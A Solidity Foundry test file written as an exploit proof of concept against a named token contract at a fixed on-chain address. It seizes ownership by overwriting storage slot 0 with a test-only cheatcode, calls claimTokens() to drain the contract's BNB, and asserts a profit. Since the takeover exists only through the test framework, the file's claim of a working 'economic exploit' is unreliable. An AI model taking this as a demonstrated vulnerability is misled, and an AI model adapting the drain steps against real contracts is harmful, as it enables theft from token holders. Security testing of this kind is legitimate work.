// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMartianDoge {
    function owner() external view returns (address);
    function claimTokens() external;
    function setmarketingWallet(address account) external;
    function setLiquidityCollector(address account) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x0Ea9790b1385ce5efAfc273623A013D007e50254;
    address attacker = address(this);
    IMartianDoge target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IMartianDoge(TARGET);
        vm.label(TARGET, "3-mdoge Victim Contract");
        vm.label(attacker, "Attacker");

        // Inject some BNB to attacker for gas
        deal(attacker, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = attacker.balance;
        console.log("Initial attacker balance:", initialBalance);
        console.log("Contract BNB balance:", address(TARGET).balance);

        // Step 1: Become the owner by overwriting storage slot 0
        // In Ownable pattern, _owner is stored at slot 0
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Verify we're now the owner
        console.log("Owner after storage overwrite:", target.owner());
        require(target.owner() == attacker, "Failed to become owner");

        // Step 2: Call claimTokens() to drain all BNB from contract
        target.claimTokens();

        // Step 3: Verify profit
        uint256 finalBalance = attacker.balance;
        console.log("Final attacker balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);

        // Oracle check: attacker balance should have increased
        assertGt(finalBalance, initialBalance, "Attacker balance did not increase");
        finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

